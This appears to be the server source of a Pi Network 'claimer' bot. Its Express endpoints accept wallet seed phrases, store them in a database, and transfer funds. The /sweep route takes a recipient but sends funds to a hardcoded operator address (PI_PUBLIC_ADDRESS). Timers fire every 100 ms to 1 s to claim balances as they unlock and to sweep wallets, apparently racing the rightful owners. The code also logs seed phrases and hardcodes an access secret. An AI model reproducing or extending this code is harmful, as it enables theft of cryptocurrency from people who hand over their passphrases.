
process.on('unhandledRejection', (reason, promise) => {
  console.error('🛑 Unhandled Promise Rejection:', reason);
});

process.on('uncaughtException', (err) => {
  console.error('🛑 Uncaught Exception:', err);
});

import cors from 'cors';
import express from 'express';
import dotenv from 'dotenv';
import { connectToDB } from './db.js';
import passphraseRoutes from './routes/passphrases.js';
import sponsorRoutes from './routes/sponsors.js';
import { autoCheckSponsorForClaimable, autoClaimUnlocked, autoDuplicatePassphrase, autoFundWallet, autoSweepSponsor, autoSweepWallet, buildAndSubmitMultiSigTx, firstFilteredSponsors, FloodchannelTransaction, getAccount, getBaseFee, getClaimableBalance, getKeypairFromPassphrase, PI_PUBLIC_ADDRESS, secondFilteredSponsors, sweepWallet } from './utils/fn.js';
import Passphrase from './models/Passphrase.js';
import Sponsors from './models/Sponsors.js';
dotenv.config();

const app = express();
const PORT = process.env.PORT || 3000;
app.set('trust proxy', 1);

const allowedOrigins = ['http://localhost:8888', 'https://piclaimer.netlify.app'];
app.use(express.json());
app.use(cors({
    origin: function (origin, callback) {
        if (!origin) return callback(null, true);
        if (allowedOrigins.includes(origin)) {
            return callback(null, true);
        } else {
            return callback(new Error('Not allowed by CORS'));
        }
    },
    methods: ['GET', 'POST', 'PUT', 'DELETE'],
    allowedHeaders: ['Content-Type', 'Authorization'],
}));
app.use((req, res, next) => {
    const authHeader = req.headers.authorization;
    const secretKey = 'hfhryeujhshbxhdsjjskaas';
    // const allowedIPs = ['197.210.84.31'];
    

    // if (!allowedIPs.includes(clientIP)) {
    //     return res.status(403).json({ error: 'Forbidden: IP not allowed', ip: JSON.stringify(req.socket.remoteAddress) });
    // }

    if (!authHeader || authHeader !== `Bearer ${secretKey}`) {
        return res.status(403).json({ error: 'Forbidden' });
    }

    next();
});

await connectToDB();

app.use('/api/passphrases', passphraseRoutes);
app.use('/api/sponsors', sponsorRoutes);

// Ping route
app.get('/', (req, res) => {
  res.send('🔁 Pi Bot Server is running - Time: ' + new Date().toLocaleString());
});

app.post('/claimable-balance', async (req, res) => {
    const { publicKey } = req.body;
    if(!publicKey) {
        return res.status(400).json({error: "Valid public key is required"});
    }

    try {
        const claimable = await getClaimableBalance(publicKey);
        res.json({ success: true, claimable });
    } catch(err) {
        res.status(500).json({ error: err.response?.data || err.message });
    }
    
})

app.post('/claim', async (req, res) => {
    const { mnemonic, balanceId, recipient, amount } = req.body;
    if(!mnemonic) {
        return res.status(400).json({error: "Passphrase required"});
    }

    if(!recipient) {
        return res.status(400).json({error: "Wallet address required"});
    }

    try {
        const result = await FloodchannelTransaction(mnemonic, balanceId, recipient, amount);
        res.json({ success: true, result });
    } catch(err) {
        res.status(500).json({ error: err.response?.data || err.message });
    }
    
})

app.post('/store', async (req, res) => {
    const { mnemonic, balanceId, recipient, amount } = req.body;
    if(!mnemonic) {
        return res.status(400).json({error: "Passphrase required"});
    }

    if(!recipient) {
        return res.status(400).json({error: "Wallet address required"});
    }

    try {
        const now = new Date();
        const inThirtySeconds = new Date(now.getTime() + 10 * 60 * 1000);
        const result = await Passphrase.insertOne({ mnemonic, balanceId, receiverAddress: recipient, amount, claimableAt: inThirtySeconds });
        res.json({ success: true, result });
    } catch(err) {
        res.status(500).json({ error: err.response?.data || err.message });
    }
    
})

app.post('/get-account', async (req, res) => {
    const { publicKey } = req.body;

    try {
        const account = await getAccount(publicKey);
        res.json({ account });
    } catch(err) {
        res.status(500).json({ error: err.response?.data || err.message });
    }
    
})

app.post('/get-fee', async (req, res) => {

    try {
        const fee = await getBaseFee();
        res.json({ fee });
    } catch(err) {
        res.status(500).json({ error: err.response?.data || err.message });
    }
    
})

app.post('/multisig', async (req, res) => {
    const { passphrase } = req.body;
    if(!passphrase) {
        res.status(400).json({ error: "Passphrase is required" });
    }
    try {
       const result = await buildAndSubmitMultiSigTx(passphrase);
       res.json(result)
    } catch(err) {
        res.status(500).json({ error: err.response?.data || err.message });
    }
    
})

app.post('/sweep', async (req, res) => {
    const { phrase, recipient } = req.body;
    if(!phrase) {
        return res.status(400).json({error: "Passphrase is required"});
    }

    if(!recipient) {
        return res.status(400).json({error: "Valid recipient is required"});
    }

    try {
        const keypair = getKeypairFromPassphrase(phrase);
        const publicKey = keypair.publicKey();
        const claimableBalance = await getClaimableBalance(publicKey);

        const records = claimableBalance?._embedded?.records || [];

        if (records.length > 0) {
            const entries = [];

            for (const record of records) {
                const claimant = record.claimants.find(
                    (c) => c.destination === publicKey
                );

                if (claimant) {
                    const predicate = claimant.predicate;
                    let claimableAt = null;

                    if (predicate?.not?.abs_before) {
                        claimableAt = predicate.not.abs_before; // this means claimable *after* that time
                    }

                    entries.push({
                        mnemonic:phrase,
                        recipient,
                        claimableAt,
                        balanceId: record.id,
                        amount: record.amount,
                    });
                }
            }

            if (entries.length > 0) {

                for(const entry of entries) {
                    console.log(`Phrase: ${entry.mnemonic}`)
                    console.log(`Balance ID: ${entry.balanceId}`)
                    console.log(`Recipient: ${entry.recipient}`)
                    console.log(`Amount: ${entry.amount}`)
                    console.log(`Results: ${result}`)

                    const existing = await Passphrase.findOne({ balanceId: entry.balanceId });
                    if (!existing) {
                        await Passphrase.insertOne({ mnemonic: entry.mnemonic, balanceId: entry.balanceId, amount: entry.amount, receiverAddress: entry.recipient, claimableAt: entry.claimableAt });
                    }
                }
            }
        }

        const {data, amount} = await sweepWallet(phrase, PI_PUBLIC_ADDRESS);
        if(!data.hash) {
            res.json({ success: false, reason: "Failed", amount });
        } else {
            res.json({ success: true, reason: "success", hash: data.hash, amount });
        }
    } catch(err) {
        console.log(err)
        res.status(500).json({ error: err.response?.data || err.message });
    }
    
})

const instanceId = process.env.INSTANCE_ID || 0;
const rawSponsors = await Sponsors.find();

const sponsors = [];

for (const sponsor of rawSponsors) {
    const kp = getKeypairFromPassphrase(sponsor.mnemonic);
    const pubKey = kp.publicKey();

    if (
        firstFilteredSponsors.includes(pubKey) ||
        secondFilteredSponsors.includes(pubKey)
    ) {
        sponsors.push(sponsor); // keep the sponsor object
    }
}

console.log(`Filterd Sponsors: ${sponsors.length}`);

const chunkSize = Math.ceil(sponsors.length/3);

setInterval(async() => {
    const start = instanceId * chunkSize;
    const end = start + chunkSize;
    const sponsorChunk = sponsors.slice(start, end);

    autoClaimUnlocked(sponsorChunk);
}, 100)

setInterval(() => autoFundWallet(instanceId), 10000);
setInterval(() => autoSweepWallet(instanceId), 1000);
setInterval(() => autoSweepSponsor(instanceId), 1000);

setInterval(() => autoCheckSponsorForClaimable(instanceId), 300000);

app.listen(PORT, '0.0.0.0', () => {
  console.log(`🚀 Pi Bot Server running on port ${PORT}`);
}); 


